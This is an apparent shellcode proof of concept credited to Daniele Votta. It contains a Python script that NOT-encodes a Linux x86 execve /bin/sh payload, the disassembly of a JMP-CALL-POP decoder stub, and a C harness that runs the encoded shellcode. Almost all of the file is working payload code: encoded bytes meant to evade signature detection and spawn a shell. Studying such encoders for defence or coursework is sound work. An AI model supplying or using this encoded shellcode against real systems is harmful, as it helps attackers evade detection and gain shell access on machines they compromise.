/*
; Date: 02/03/2019
; NOT-Encoder.py
; Author: Daniele Votta
; Description: This program encode shellcode with NOT technique.
; Tested on: i686 GNU/Linux
; Shellcode Length:25

#!/usr/bin/python
# Python NOT Encoder

# Execve /bin/sh
shellcode =("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

print 'Encoded shellcode...'

for x in bytearray(shellcode):
	# NOT Encoding
	y = ~x
	encoded += '\\x'
	encoded += '%02x' % (y & 0xff)

	encoded2 += '0x'
	encoded2 += '%02x,' % (y & 0xff)

print encoded +"\n"
print encoded2
print 'Len: %d' % len(bytearray(shellcode))
*/

#include<stdio.h>
#include<string.h>

/*

; NOT-Decoder.asm
; Author: Daniele Votta
; Description: This program decode shellcode with NOT technique.
; Tested on: i686 GNU/Linux
; Shellcode Length:44
; JMP | CALL | POP | Techniques

NOT-Decoder:     file format elf32-i386

Disassembly of section .text:

08048080 <_start>:
 8048080:	eb 0c                	jmp    804808e <call_decoder>

08048082 <decoder>:
 8048082:	5e                   	pop    esi
 8048083:	31 c9                	xor    ecx,ecx
 8048085:	b1 19                	mov    cl,0x19

08048087 <decode>:
 8048087:	f6 16                	not    BYTE PTR [esi]
 8048089:	46                   	inc    esi
 804808a:	e2 fb                	loop   8048087 <decode>
 804808c:	eb 05                	jmp    8048093 <EncodedShellcode>

0804808e <call_decoder>:
 804808e:	e8 ef ff ff ff       	call   8048082 <decoder>

08048093 <EncodedShellcode>:
 8048093:	ce                   	into
 8048094:	3f                   	aas
 8048095:	af                   	scas   eax,DWORD PTR es:[edi]
 8048096:	97                   	xchg   edi,eax
 8048097:	d0 d0                	rcl    al,1
 8048099:	8c 97 97 d0 9d 96    	mov    WORD PTR [edi-0x69622f69],ss
 804809f:	91                   	xchg   ecx,eax
 80480a0:	76 1c                	jbe    80480be <__bss_start+0x12>
 80480a2:	af                   	scas   eax,DWORD PTR es:[edi]
 80480a3:	76 1d                	jbe    80480c2 <__bss_start+0x16>
 80480a5:	ac                   	lods   al,BYTE PTR ds:[esi]
 80480a6:	76 1e                	jbe    80480c6 <__bss_start+0x1a>
 80480a8:	4f                   	dec    edi
 80480a9:	f4                   	hlt
 80480aa:	32                   	.byte 0x32
 80480ab:	7f                   	.byte 0x7f
[+] Extract Shellcode ...
"\xeb\x0c\x5e\x31\xc9\xb1\x19\xf6\x16\x46\xe2\xfb\xeb\x05\xe8\xef\xff\xff\xff\xce\x3f\xaf\x97\xd0\xd0\x8c\x97\x97\xd0\x9d\x96\x91\x76\x1c\xaf\x76\x1d\xac\x76\x1e\x4f\xf4\x32\x7f"

======================= POC Daniele Votta =======================
*/

/* NOT Encoded Execve /bin/sh */
unsigned char code[] = \
"\xeb\x0c\x5e\x31\xc9\xb1\x19\xf6\x16\x46\xe2\xfb\xeb\x05\xe8\xef\xff\xff\xff\xce\x3f\xaf\x97\xd0\xd0\x8c\x97\x97\xd0\x9d\x96\x91\x76\x1c\xaf\x76\x1d\xac\x76\x1e\x4f\xf4\x32\x7f";

int main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}